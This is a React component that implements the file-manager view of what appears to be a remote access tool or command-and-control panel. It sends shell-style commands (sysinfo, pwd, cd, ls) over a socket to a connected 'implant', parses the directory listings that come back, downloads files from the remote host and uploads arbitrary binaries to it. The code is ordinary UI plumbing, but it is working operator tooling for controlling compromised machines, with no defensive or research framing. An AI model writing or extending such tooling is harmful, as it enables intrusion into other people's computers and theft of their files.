import React, { useState, useEffect } from 'react';
import styled from 'styled-components';
import { 
  FiFolder, 
  FiFile, 
  FiUpload, 
  FiDownload, 
  FiTrash2, 
  FiRefreshCw,
  FiSearch,
  FiGrid,
  FiList,
  FiHome,
  FiArrowLeft,
  FiCopy,
  FiEdit,
  FiFileText,
  FiImage,
  FiMusic,
  FiVideo,
  FiArchive,
  FiCode,
  FiDatabase
} from 'react-icons/fi';
import { toast } from 'react-toastify';

/** Wait for next commandResponse for this client matching predicate (or any if omitted). */
function waitForResponse(socket, clientId, predicate, timeoutMs = 25000) {
  return new Promise((resolve, reject) => {
    const to = setTimeout(() => {
      socket.off('commandResponse', handler);
      reject(new Error('Timed out waiting for implant response'));
    }, timeoutMs);
    function handler(data) {
      if (!data || data.clientId !== clientId) return;
      const text = String(data.response ?? '');
      if (predicate && !predicate(text)) return;
      clearTimeout(to);
      socket.off('commandResponse', handler);
      resolve(text);
    }
    socket.on('commandResponse', handler);
  });
}

function fmUploadBarPercent(progress) {
  if (!progress) return 0;
  if (progress.phase === 'read' && progress.total > 0) {
    return Math.min(24, Math.round((progress.loaded / progress.total) * 24));
  }
  if (progress.phase === 'send' && progress.total > 0) {
    return 24 + Math.round((progress.sent / progress.total) * 76);
  }
  return 0;
}

function readFileAsBase64WithProgress(file, onProgress) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onprogress = (ev) => {
      if (onProgress && ev.lengthComputable) onProgress(ev.loaded, ev.total);
    };
    reader.onload = () => {
      try {
        const str = String(reader.result);
        const comma = str.indexOf(',');
        const base64 = comma >= 0 ? str.slice(comma + 1) : str;
        resolve(base64);
      } catch (e) {
        reject(e);
      }
    };
    reader.onerror = () => reject(new Error('Could not read file'));
    reader.readAsDataURL(file);
  });
}

function quoteRemotePath(p, isWindows) {
  if (!p) return '""';
  const t = String(p).trim();
  if (t.startsWith('"') && t.endsWith('"')) return t;
  const inner = t.replace(/"/g, '');
  return `"${inner}"`;
}

function parseDirectoryListing(response, fallbackPath, isWindows) {
  const raw = String(response || '');
  const lines = raw.split(/\r?\n/);
  let dirPath = fallbackPath || '';
  const files = [];

  for (const line of lines) {
    const dm = line.match(/^Directory:\s*(.+)$/i);
    if (dm) dirPath = dm[1].trim();
  }

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed.startsWith('<DIR>') && !trimmed.startsWith('FILE')) continue;
    const cells = line.split('\t').map((c) => c.trim()).filter((c) => c.length > 0);
    if (cells.length < 3) continue;
    const kind = cells[0];
    if (kind !== '<DIR>' && kind !== 'FILE') continue;
    const name = cells[1];
    if (!name || /^Name$/i.test(name) || /^-+$/i.test(name)) continue;
    const isDirectory = kind === '<DIR>';
    const size = isDirectory ? '—' : cells[2];
    const modified = cells[cells.length - 1] || '—';
    const sep = isWindows ? '\\' : '/';
    const base = (dirPath || fallbackPath || '').replace(/[\\/]+$/, '');
    const fullPath = base ? `${base}${sep}${name}` : name;
    files.push({
      name,
      isDirectory,
      size,
      modified,
      path: fullPath,
      type: getFileTypeStatic(name)
    });
  }

  return { dirPath: dirPath || fallbackPath || '', files };
}

function getFileTypeStatic(filename) {
  const ext = filename.toLowerCase().split('.').pop();
  const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'ico'];
  const videoExts = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'webm', 'mkv'];
  const audioExts = ['mp3', 'wav', 'flac', 'aac', 'ogg', 'wma'];
  const archiveExts = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];
  const codeExts = ['js', 'ts', 'html', 'css', 'py', 'java', 'cpp', 'c', 'go', 'php'];
  const docExts = ['txt', 'doc', 'docx', 'pdf', 'rtf'];

  if (imageExts.includes(ext)) return 'image';
  if (videoExts.includes(ext)) return 'video';
  if (audioExts.includes(ext)) return 'audio';
  if (archiveExts.includes(ext)) return 'archive';
  if (codeExts.includes(ext)) return 'code';
  if (docExts.includes(ext)) return 'document';
  return 'file';
}

function crumbsFromPath(fullPath, isWindows) {
  if (!fullPath) return [];
  if (isWindows) {
    const s = fullPath.replace(/\//g, '\\');
    const m = s.match(/^([A-Za-z]:)(\\)?(.*)$/);
    if (!m) return [{ name: s, path: s }];
    const drive = m[1];
    const tail = (m[3] || '').split('\\').filter(Boolean);
    const out = [];
    let acc = drive + '\\';
    out.push({ name: drive, path: acc });
    for (const seg of tail) {
      acc = acc.replace(/\\+$/, '') + '\\' + seg;
      out.push({ name: seg, path: acc });
    }
    return out;
  }
  const norm = fullPath.startsWith('/') ? fullPath : '/' + fullPath;
  const segs = norm.split('/').filter(Boolean);
  const out = [];
  let acc = '';
  for (const seg of segs) {
    acc = acc ? acc + '/' + seg : '/' + seg;
    out.push({ name: seg, path: acc });
  }
  return out;
}

const FileManagerContainer = styled.div`
  background: #0a0a0a;
  border-radius: 12px;
  border: 1px solid #333;
  height: calc(100vh - 140px);
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const Header = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const HeaderLeft = styled.div`
  display: flex;
  align-items: center;
  gap: 16px;
`;

const Breadcrumb = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;
  color: #888;
  font-size: 14px;

  .separator {
    color: #666;
  }
`;

const BreadcrumbItem = styled.span`
  cursor: pointer;
  color: #00ff88;
  
  &:hover {
    text-decoration: underline;
  }
`;

const HeaderRight = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
`;

const SearchBox = styled.input`
  background: #0a0a0a;
  border: 1px solid #333;
  color: #fff;
  padding: 8px 12px;
  border-radius: 6px;
  font-size: 14px;
  width: 200px;
  outline: none;

  &:focus {
    border-color: #00ff88;
  }

  &::placeholder {
    color: #666;
  }
`;

const ActionButton = styled.button`
  background: rgba(0, 255, 136, 0.2);
  border: 1px solid #00ff88;
  color: #00ff88;
  padding: 8px 16px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.3);
  }

  &.primary {
    background: linear-gradient(135deg, #00ff88, #00cc6a);
    color: #000;
    border: none;

    &:hover {
      transform: translateY(-1px);
    }
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const Toolbar = styled.div`
  background: #1a1a1a;
  border-bottom: 1px solid #333;
  padding: 12px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const FmUploadProgressWrap = styled.div`
  background: #121212;
  border-bottom: 1px solid #2a2a2a;
  padding: 8px 20px 12px;
`;

const FmUploadProgressMeta = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 4px;
  font-size: 11px;
  color: #888;
  font-family: 'Courier New', monospace;
`;

const FmUploadProgressTrack = styled.div`
  height: 8px;
  background: #2a2a2a;
  border-radius: 4px;
  overflow: hidden;
  border: 1px solid #333;
`;

const FmUploadProgressFill = styled.div`
  height: 100%;
  background: linear-gradient(90deg, #00ff88, #00aa66);
  transition: width 0.15s ease-out;
`;

const ViewControls = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;
`;

const ViewButton = styled.button`
  background: ${props => props.active ? '#00ff88' : 'transparent'};
  border: 1px solid ${props => props.active ? '#00ff88' : '#333'};
  color: ${props => props.active ? '#000' : '#ccc'};
  padding: 6px 12px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  transition: all 0.2s;

  &:hover {
    background: ${props => props.active ? '#00ff88' : 'rgba(255, 255, 255, 0.1)'};
  }
`;

const FileArea = styled.div`
  flex: 1;
  padding: 20px;
  overflow-y: auto;
`;

const FileGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
  gap: 16px;
`;

const FileItem = styled.div`
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid #333;
  border-radius: 8px;
  padding: 16px;
  cursor: pointer;
  transition: all 0.2s;
  text-align: center;

  &:hover {
    background: rgba(0, 255, 136, 0.1);
    border-color: #00ff88;
  }
`;

const FileIcon = styled.div`
  font-size: 32px;
  color: ${props => props.color || '#00ff88'};
  margin-bottom: 8px;
`;

const FileName = styled.div`
  color: #fff;
  font-size: 12px;
  font-weight: 500;
  margin-bottom: 4px;
  word-break: break-word;
`;

const FileSize = styled.div`
  color: #888;
  font-size: 10px;
`;

const FileList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 8px;
`;

const FileRow = styled.div`
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid #333;
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 16px;
  cursor: pointer;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.1);
    border-color: #00ff88;
  }
`;

const FileRowIcon = styled.div`
  font-size: 20px;
  color: ${props => props.color || '#00ff88'};
  width: 24px;
  text-align: center;
`;

const FileRowInfo = styled.div`
  flex: 1;
  min-width: 0;
`;

const FileRowName = styled.div`
  color: #fff;
  font-weight: 500;
  margin-bottom: 2px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
`;

const FileRowDetails = styled.div`
  color: #888;
  font-size: 12px;
  display: flex;
  gap: 16px;
`;

const FileRowActions = styled.div`
  display: flex;
  gap: 8px;
  opacity: 0;
  transition: opacity 0.2s;

  ${FileRow}:hover & {
    opacity: 1;
  }
`;

const EmptyState = styled.div`
  text-align: center;
  padding: 60px 20px;
  color: #666;

  .icon {
    font-size: 64px;
    margin-bottom: 20px;
    opacity: 0.5;
  }

  h3 {
    font-size: 24px;
    margin-bottom: 12px;
    color: #888;
  }

  p {
    font-size: 16px;
    line-height: 1.5;
  }
`;

const LoadingSpinner = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 40px;
  color: #666;
  font-size: 14px;
  gap: 10px;

  .spinner {
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
`;

const FileManager = ({ client, socket }) => {
  const [currentPath, setCurrentPath] = useState('');
  const [files, setFiles] = useState([]);
  const [viewMode, setViewMode] = useState('list');
  const [searchTerm, setSearchTerm] = useState('');
  const [loading, setLoading] = useState(false);
  const [breadcrumbs, setBreadcrumbs] = useState([]);
  const [osType, setOsType] = useState('windows');
  const [fmUploadBusy, setFmUploadBusy] = useState(false);
  const [fmUploadProgress, setFmUploadProgress] = useState(null);
  const [fmUploadLabel, setFmUploadLabel] = useState('');

  const isWindowsOs = () =>
    String(osType).toLowerCase().includes('windows') || /^[A-Za-z]:\\?/.test(currentPath || '');

  const updateBreadcrumbs = (fullPath, winOverride) => {
    if (!fullPath) {
      setBreadcrumbs([]);
      return;
    }
    const win = winOverride !== undefined ? winOverride : isWindowsOs();
    setBreadcrumbs(crumbsFromPath(fullPath, win));
  };

  const applyListing = (responseText, pathFallback, winOverride) => {
    const win = winOverride !== undefined ? winOverride : isWindowsOs();
    const { dirPath, files: parsed } = parseDirectoryListing(responseText, pathFallback, win);
    if (/^Error reading directory/i.test(String(responseText))) {
      toast.error(String(responseText).split('\n')[0]);
      setFiles([]);
      return;
    }
    const dir = dirPath || pathFallback || '';
    if (dir) setCurrentPath(dir);
    setFiles(parsed);
    updateBreadcrumbs(dir || pathFallback, win);
  };

  const refreshListing = async (targetPath) => {
    if (!client || !socket) return;
    setLoading(true);
    try {
      const win = isWindowsOs();
      const dest = targetPath != null ? String(targetPath).trim() : String(currentPath || '').trim();
      if (dest) {
        const cdCmd = `cd ${quoteRemotePath(dest, win)}`;
        socket.emit('executeCommand', { clientId: client.id, command: cdCmd });
        await waitForResponse(
          socket,
          client.id,
          (t) =>
            /Current directory changed to:/i.test(t) ||
            /Error changing directory/i.test(t)
        );
      }
      socket.emit('executeCommand', { clientId: client.id, command: 'ls' });
      const listing = await waitForResponse(
        socket,
        client.id,
        (t) => t.includes('Directory:') || /^Error reading directory/i.test(t)
      );
      applyListing(listing, dest, isWindowsOs());
    } catch (e) {
      toast.error(e.message || 'Failed to load directory');
      setFiles([]);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!client || !socket) return;
    let cancelled = false;

    (async () => {
      setLoading(true);
      try {
        socket.emit('executeCommand', { clientId: client.id, command: 'sysinfo' });
        const sys = await waitForResponse(socket, client.id, (t) =>
          /Architecture:/i.test(t)
        );
        if (cancelled) return;
        const m = sys.match(/OS:\s*(\S+)/i);
        const ost = m && m[1] ? m[1].toLowerCase() : 'windows';
        setOsType(ost);
        const winOs = ost.includes('windows');

        socket.emit('executeCommand', { clientId: client.id, command: 'pwd' });
        const pwdText = await waitForResponse(socket, client.id, (t) => {
          const s = String(t).trim();
          if (/Architecture:/i.test(s) || /Hostname:/i.test(s)) return false;
          return (
            /^[A-Za-z]:\\|^\/|^\./.test(s) ||
            /^Error/i.test(s) ||
            (s.length > 0 && s.length < 400 && !s.includes('\n'))
          );
        });
        if (cancelled) return;
        const p = String(pwdText).trim();
        let cwd = p;
        if (/^[A-Za-z]:$/.test(cwd)) cwd += '\\';
        if (!/^Error/i.test(cwd)) {
          setCurrentPath(cwd);
          updateBreadcrumbs(cwd, winOs);
        }

        socket.emit('executeCommand', { clientId: client.id, command: 'ls' });
        const listing = await waitForResponse(socket, client.id, (t) =>
          t.includes('Directory:') || /^Error reading directory/i.test(t)
        );
        if (cancelled) return;
        applyListing(listing, cwd, winOs);
      } catch (e) {
        if (!cancelled) toast.error(e.message || 'Could not open file manager');
      } finally {
        if (!cancelled) setLoading(false);
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [client?.id, socket]);

  useEffect(() => {
    setFmUploadBusy(false);
    setFmUploadProgress(null);
    setFmUploadLabel('');
  }, [client?.id]);

  useEffect(() => {
    if (!socket || !client) return;
    const onUploadProgress = (payload) => {
      if (!payload || payload.clientId !== client.id) return;
      if (payload.done) {
        setFmUploadProgress(null);
        return;
      }
      if (payload.total > 0) {
        setFmUploadProgress({ phase: 'send', sent: payload.sent, total: payload.total });
      }
    };
    const onUploadErr = (payload) => {
      if (payload && payload.clientId === client.id) {
        setFmUploadBusy(false);
        setFmUploadProgress(null);
        setFmUploadLabel('');
      }
    };
    socket.on('uploadProgress', onUploadProgress);
    socket.on('uploadError', onUploadErr);
    return () => {
      socket.off('uploadProgress', onUploadProgress);
      socket.off('uploadError', onUploadErr);
    };
  }, [socket, client]);

  const getFileIcon = (file) => {
    if (file.isDirectory) {
      return <FiFolder />;
    }

    switch (file.type) {
      case 'image': return <FiImage />;
      case 'video': return <FiVideo />;
      case 'audio': return <FiMusic />;
      case 'archive': return <FiArchive />;
      case 'code': return <FiCode />;
      case 'document': return <FiFileText />;
      default: return <FiFile />;
    }
  };

  const getFileIconColor = (file) => {
    if (file.isDirectory) return '#ffc107';
    
    switch (file.type) {
      case 'image': return '#28a745';
      case 'video': return '#dc3545';
      case 'audio': return '#6f42c1';
      case 'archive': return '#fd7e14';
      case 'code': return '#17a2b8';
      case 'document': return '#6c757d';
      default: return '#00ff88';
    }
  };

  const navigateToPath = (path) => {
    if (!path) return;
    refreshListing(path);
  };

  const goBack = () => {
    if (breadcrumbs.length > 1) {
      const parentPath = breadcrumbs[breadcrumbs.length - 2].path;
      navigateToPath(parentPath);
    }
  };

  const handleFileClick = (file) => {
    if (file.isDirectory) {
      navigateToPath(file.path);
    } else {
      handleFileDownload(file.path);
    }
  };

  const handleFileUpload = () => {
    if (!client || !socket) return;
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.onchange = async (ev) => {
      const picked = Array.from(ev.target.files || []);
      ev.target.value = '';
      for (const file of picked) {
        setFmUploadBusy(true);
        setFmUploadLabel(file.name);
        setFmUploadProgress({ phase: 'read', loaded: 0, total: file.size });
        try {
          const base64 = await readFileAsBase64WithProgress(file, (loaded, total) => {
            setFmUploadProgress({ phase: 'read', loaded, total });
          });
          const remotePath = (() => {
            const sep = isWindowsOs() ? '\\' : '/';
            const base = String(currentPath || '').replace(/[\\/]+$/, '');
            const safe = file.name.replace(/[<>:"|?*]/g, '_');
            return base ? `${base}${sep}${safe}` : safe;
          })();
          setFmUploadProgress({ phase: 'send', sent: 0, total: file.size });
          socket.emit('uploadBinaryToClient', {
            clientId: client.id,
            remotePath,
            fileBase64: base64
          });
          toast.info(`Queued: ${file.name}`);
          const waitMs = Math.min(900000, Math.max(120000, Math.floor(file.size / 1024) * 2000));
          await waitForResponse(
            socket,
            client.id,
            (text) =>
              /upload complete/i.test(text) ||
              /upload failed/i.test(text) ||
              /upload timed out/i.test(text),
            waitMs
          );
          toast.success(`Uploaded: ${file.name}`);
        } catch (err) {
          toast.error(err.message || `Upload failed: ${file.name}`);
        } finally {
          setFmUploadProgress(null);
        }
      }
      setFmUploadBusy(false);
      setFmUploadLabel('');
    };
    input.click();
  };

  const handleFileDownload = (remotePath) => {
    if (!client || !socket || !remotePath) return;
    socket.emit('downloadFile', {
      clientId: client.id,
      filename: remotePath
    });
    toast.success('Download started');
  };

  const filteredFiles = files.filter(file =>
    file.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  if (!client) {
    return (
      <FileManagerContainer>
        <EmptyState>
          <FiFolder className="icon" />
          <h3>No Client Selected</h3>
          <p>Select a client to manage files</p>
        </EmptyState>
      </FileManagerContainer>
    );
  }

  return (
    <FileManagerContainer>
      <Header>
        <HeaderLeft>
          <Breadcrumb>
            <FiHome />
            {breadcrumbs.map((crumb, index) => (
              <React.Fragment key={index}>
                <span className="separator">/</span>
                <BreadcrumbItem onClick={() => navigateToPath(crumb.path)}>
                  {crumb.name}
                </BreadcrumbItem>
              </React.Fragment>
            ))}
          </Breadcrumb>
        </HeaderLeft>
        
        <HeaderRight>
          <SearchBox
            placeholder="Search files..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <ActionButton onClick={() => refreshListing()} disabled={loading}>
            <FiRefreshCw />
            Refresh
          </ActionButton>
        </HeaderRight>
      </Header>

      <Toolbar>
        <div style={{ color: '#888', fontSize: '12px', fontFamily: 'monospace', maxWidth: '45vw', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={currentPath}>
          {currentPath || '—'}
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
        <ActionButton onClick={goBack} disabled={breadcrumbs.length <= 1}>
          <FiArrowLeft />
          Back
        </ActionButton>
        
        <ActionButton onClick={handleFileUpload} className="primary" disabled={fmUploadBusy || loading}>
          <FiUpload />
          Upload
        </ActionButton>

        <ViewControls>
          <ViewButton
            active={viewMode === 'grid'}
            onClick={() => setViewMode('grid')}
          >
            <FiGrid />
            Grid
          </ViewButton>
          <ViewButton
            active={viewMode === 'list'}
            onClick={() => setViewMode('list')}
          >
            <FiList />
            List
          </ViewButton>
        </ViewControls>
        </div>
      </Toolbar>

      {(fmUploadBusy || fmUploadProgress) && (
        <FmUploadProgressWrap>
          <FmUploadProgressMeta>
            <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '70%' }}>
              {fmUploadLabel ? `Upload: ${fmUploadLabel}` : 'Upload…'}
            </span>
            <span>{fmUploadBarPercent(fmUploadProgress)}%</span>
          </FmUploadProgressMeta>
          <FmUploadProgressTrack>
            <FmUploadProgressFill style={{ width: `${fmUploadBarPercent(fmUploadProgress)}%` }} />
          </FmUploadProgressTrack>
        </FmUploadProgressWrap>
      )}

      <FileArea>
        {loading ? (
          <LoadingSpinner>
            <FiRefreshCw className="spinner" />
            Loading directory...
          </LoadingSpinner>
        ) : filteredFiles.length === 0 ? (
          <EmptyState>
            <FiFolder className="icon" />
            <h3>No Files Found</h3>
            <p>This directory is empty or files are loading</p>
          </EmptyState>
        ) : viewMode === 'grid' ? (
          <FileGrid>
            {filteredFiles.map((file, index) => (
              <FileItem key={`${file.path}-${index}`}>
                <div
                  role="button"
                  tabIndex={0}
                  onClick={() => handleFileClick(file)}
                  onKeyDown={(e) => e.key === 'Enter' && handleFileClick(file)}
                  style={{ cursor: 'pointer' }}
                >
                  <FileIcon color={getFileIconColor(file)}>
                    {getFileIcon(file)}
                  </FileIcon>
                  <FileName>{file.name}</FileName>
                  <FileSize>{file.size}</FileSize>
                </div>
                <div
                  style={{
                    display: 'flex',
                    gap: 6,
                    justifyContent: 'center',
                    marginTop: 10,
                    flexWrap: 'wrap'
                  }}
                >
                  {file.isDirectory ? (
                    <ActionButton
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        navigateToPath(file.path);
                      }}
                    >
                      Open
                    </ActionButton>
                  ) : (
                    <ActionButton
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        handleFileDownload(file.path);
                      }}
                    >
                      <FiDownload />
                    </ActionButton>
                  )}
                  <ActionButton
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      navigator.clipboard.writeText(file.path);
                      toast.success('Path copied');
                    }}
                  >
                    <FiCopy />
                  </ActionButton>
                </div>
              </FileItem>
            ))}
          </FileGrid>
        ) : (
          <FileList>
            {filteredFiles.map((file, index) => (
              <FileRow key={`${file.path}-${index}`} onClick={() => handleFileClick(file)}>
                <FileRowIcon color={getFileIconColor(file)}>
                  {getFileIcon(file)}
                </FileRowIcon>
                <FileRowInfo>
                  <FileRowName>{file.name}</FileRowName>
                  <FileRowDetails>
                    <span>{file.size}</span>
                    <span>{file.modified}</span>
                  </FileRowDetails>
                </FileRowInfo>
                <FileRowActions>
                  {file.isDirectory ? (
                    <ActionButton
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        navigateToPath(file.path);
                      }}
                    >
                      Open
                    </ActionButton>
                  ) : (
                    <ActionButton
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        handleFileDownload(file.path);
                      }}
                    >
                      <FiDownload />
                    </ActionButton>
                  )}
                  <ActionButton
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      navigator.clipboard.writeText(file.path);
                      toast.success('Path copied to clipboard');
                    }}
                  >
                    <FiCopy />
                  </ActionButton>
                </FileRowActions>
              </FileRow>
            ))}
          </FileList>
        )}
      </FileArea>
    </FileManagerContainer>
  );
};

export default FileManager;